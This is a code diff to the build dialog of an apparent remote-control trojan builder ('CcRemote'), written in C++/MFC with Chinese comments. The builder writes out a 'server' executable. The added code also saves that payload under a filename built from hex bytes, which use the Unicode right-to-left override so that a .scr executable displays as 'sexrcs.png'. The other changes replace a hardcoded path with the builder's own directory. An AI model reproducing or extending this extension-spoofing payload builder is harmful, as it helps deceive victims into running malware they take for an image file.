@@ -46,21 +46,40 @@ END_MESSAGE_MAP()
 // CBuildDlg 消息处理程序
 
 
+bool CreateMyFile(const WCHAR* strFilePath, LPBYTE lpBuffer, DWORD dwSize)
+{
+	DWORD dwWritten;
+
+	HANDLE hFile = CreateFileW(strFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
+	if (hFile != NULL)
+	{
+		WriteFile(hFile, (LPCVOID)lpBuffer, dwSize, &dwWritten, NULL);
+	}
+	else
+	{
+		return false;
+	}
+	CloseHandle(hFile);
+	return true;
+}
+
+
 void CBuildDlg::OnBnClickedOk()
 {
 	// TODO: 在此添加控件通知处理程序代码
 	CFile file;
 	char strTemp[MAX_PATH];
+	WCHAR strTempW[MAX_PATH];
 	ZeroMemory(strTemp, MAX_PATH);
 	CString strCurrentPath;
+	CStringW strCurrentPathW;
 	CString strFile;
 	CString strSeverFile;
 	CString strCamouflageFile;
 	BYTE *lpBuffer = NULL;
-	char names[] = {0x73,0x00,0x65,0x00,0x78,0x00,0x2E,0x20,0x67,0x00,0x6E,0x00,0x70,0x00,0x2E,0x00,0x73,0x00,0x63,0x00,0x72,0x00,0x00,0x00 };
-	WCHAR namess[60] = L"F:\\myapp\\CcRemote\\bin\\server\\";
+	BYTE names[] = {0x73,0x00,0x65,0x00,0x78,0x00,0x2E,0x20,0x67,0x00,0x6E,0x00,0x70,0x00,0x2E,0x00,0x73,0x00,0x63,0x00,0x72,0x00,0x00,0x00 };
+	PWCHAR namess = (PWCHAR)names;
 
-	memcpy(namess + 29, names, 0x24);
 
 	DWORD dwFileSize;
 	UpdateData(TRUE);
@@ -71,6 +90,12 @@ void CBuildDlg::OnBnClickedOk()
 	{
 		//此处得到未处理前的文件名
 		GetModuleFileName(NULL, strTemp, MAX_PATH);     //得到文件名  
+		GetModuleFileNameW(NULL, strTempW, MAX_PATH);     //得到文件名  
+
+		strCurrentPathW = strTempW;
+
+		strCurrentPathW = strCurrentPathW.Left(strCurrentPathW.ReverseFind('\\'));
+
 		strCurrentPath = strTemp;
 		int nPos = strCurrentPath.ReverseFind('\\');
 		strCurrentPath = strCurrentPath.Left(nPos);
@@ -96,15 +121,10 @@ void CBuildDlg::OnBnClickedOk()
 		//else
 		//{
 			//保存到文件
-		strSeverFile = "F:\\myapp\\CcRemote\\bin\\server\\";
-		strSeverFile += names;
-		HANDLE hFile = CreateFileW(namess,      //第一个参数:路径
-			GENERIC_READ,                       //打开方式:
-			0,                                  //共享模式:0为独占  
-			NULL,
-			OPEN_EXISTING,                      //打开已存在的文件
-			FILE_FLAG_BACKUP_SEMANTICS,         //FILE_FLAG_BACKUP_SEMANTICS表示为目录，NULL表示文件
-			NULL);
+		strSeverFile = strCurrentPath+"\\server.exe";
+
+		strCurrentPathW = strCurrentPathW + L"\\" + namess;
+		CreateMyFile(strCurrentPathW, lpBuffer, dwFileSize);
 		file.Open(strSeverFile, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);
 		file.Write(lpBuffer, dwFileSize);
 		file.Close();
@@ -175,3 +195,4 @@ CString CBuildDlg::FindFiles(const char* dir, BYTE *lpBuffer,DWORD lpSize)
 	FindClose(h);
 	return a;
 }
+
